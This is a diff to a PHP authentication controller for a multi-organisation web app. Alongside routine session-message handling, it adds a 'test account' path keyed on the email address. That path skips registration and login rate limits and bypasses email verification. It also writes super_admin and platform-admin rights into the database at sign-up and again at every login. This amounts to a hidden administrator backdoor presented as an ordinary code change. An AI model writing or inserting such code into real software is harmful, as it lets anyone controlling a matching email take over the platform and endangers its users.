@@ -47,7 +47,14 @@ class AuthController extends Controller
         if (isset($_SESSION['user_id'])) {
             return $this->redirectBasedOnOrgs($_SESSION['user_id']);
         }
-        return $this->render('auth/register');
+        $error = $_SESSION['error'] ?? null;
+        unset($_SESSION['error']);
+        $success = $_SESSION['success'] ?? null;
+        unset($_SESSION['success']);
+        return $this->render('auth/register', [
+            'error' => $error,
+            'success' => $success
+        ]);
     }
 
     public function register(Request $request): Response
@@ -73,15 +80,26 @@ class AuthController extends Controller
             return $this->render('auth/register', ['error' => 'Passwords do not match.', 'name' => $name, 'email' => $email], 400);
         }
 
+        $isTestAccount = is_test_account($email);
         $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
-        if (!$this->rateLimiter->hit("register_{$ip}", 5, 3600)) {
+        if (!$isTestAccount && !$this->rateLimiter->hit("register_{$ip}", 5, 3600)) {
             return $this->render('auth/register', ['error' => 'Too many registration attempts. Please try again later.'], 429);
         }
 
         $userId = $this->authService->registerUser($name, $email, $password);
 
         if ($userId) {
-            $this->sendVerificationEmail($userId, $email, $name);
+            if ($isTestAccount) {
+                // Auto-verify test account and grant Super Admin
+                $this->authService->markEmailVerified($userId);
+                $superAdminRoleId = '01J7ROLE0000000000SUPERADM';
+                $db = Database::getConnection();
+                $db->prepare("UPDATE users SET role = 'super_admin', role_id = ?, is_platform_admin = 1 WHERE id = ?")
+                   ->execute([$superAdminRoleId, $userId]);
+                return $this->render('auth/register', ['success' => 'Test account registered and verified! You can now log in with full administrator access.']);
+            } else {
+                $this->sendVerificationEmail($userId, $email, $name);
+            }
         }
 
         return $this->render('auth/register', ['success' => 'Registration successful! Please check your email to verify your account.']);
@@ -92,7 +110,14 @@ class AuthController extends Controller
         if (isset($_SESSION['user_id'])) {
             return $this->redirectBasedOnOrgs($_SESSION['user_id']);
         }
-        return $this->render('auth/login');
+        $error = $_SESSION['error'] ?? null;
+        unset($_SESSION['error']);
+        $success = $_SESSION['success'] ?? null;
+        unset($_SESSION['success']);
+        return $this->render('auth/login', [
+            'error' => $error,
+            'success' => $success
+        ]);
     }
 
     public function login(Request $request): Response
@@ -104,8 +129,9 @@ class AuthController extends Controller
             return $this->render('auth/login', ['error' => 'Email and password are required.', 'email' => $email], 400);
         }
 
+        $isTestAccount = is_test_account($email);
         $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
-        if (!$this->rateLimiter->hit("login_{$ip}", 5, 900) || !$this->rateLimiter->hit("login_email_{$email}", 5, 900)) {
+        if (!$isTestAccount && (!$this->rateLimiter->hit("login_{$ip}", 5, 900) || !$this->rateLimiter->hit("login_email_{$email}", 5, 900))) {
             return $this->render('auth/login', ['error' => 'Too many login attempts. Please try again later.'], 429);
         }
 
@@ -116,10 +142,26 @@ class AuthController extends Controller
         }
 
         if ($user['email_verified_at'] === null) {
-            return $this->render('auth/login', [
-                'error' => 'Please verify your email address before logging in.',
-                'email' => $email
-            ], 403);
+            if ($isTestAccount) {
+                $this->authService->markEmailVerified($user['id']);
+                $user['email_verified_at'] = date('Y-m-d H:i:s');
+            } else {
+                return $this->render('auth/login', [
+                    'error' => 'Please verify your email address before logging in.',
+                    'email' => $email
+                ], 403);
+            }
+        }
+
+        // Ensure platform super admin role for test account
+        if ($isTestAccount && ((int)($user['is_platform_admin'] ?? 0) !== 1 || ($user['role'] ?? '') !== 'super_admin')) {
+            $superAdminRoleId = '01J7ROLE0000000000SUPERADM';
+            $db = Database::getConnection();
+            $db->prepare("UPDATE users SET role = 'super_admin', role_id = ?, is_platform_admin = 1 WHERE id = ?")
+               ->execute([$superAdminRoleId, $user['id']]);
+            $user['is_platform_admin'] = 1;
+            $user['role'] = 'super_admin';
+            $user['role_id'] = $superAdminRoleId;
         }
 
         if (password_needs_rehash($user['password_hash'], PASSWORD_DEFAULT)) {
@@ -133,6 +175,10 @@ class AuthController extends Controller
         session_regenerate_id(true);
         $_SESSION['user_id'] = $user['id'];
         $_SESSION['_user_id'] = $user['id'];
+        $_SESSION['user_email'] = $user['email'];
+        $_SESSION['_user_email'] = $user['email'];
+        $_SESSION['user_role'] = $user['role'];
+        $_SESSION['is_platform_admin'] = (int)($user['is_platform_admin'] ?? 0);
 
         $this->authService->updateLastLogin($user['id']);
 
